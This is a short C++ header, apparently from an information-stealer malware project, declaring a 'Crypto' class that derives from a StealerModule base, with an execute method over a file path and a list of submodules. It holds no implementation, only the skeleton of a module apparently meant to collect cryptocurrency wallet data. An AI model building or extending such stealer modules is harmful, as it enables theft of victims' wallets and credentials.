//
// Created by TERETERY on 07.06.2024.
//

#ifndef STEALER_CRYPTO_H
#define STEALER_CRYPTO_H


#include "../../StealerModule.h"
#include <thread>

class Crypto : public StealerModule {
public:
    Crypto();
    void execute(fs::path& root) override;

private:
    std::list<StealerModule*> modules;
};


#endif //STEALER_CRYPTO_H
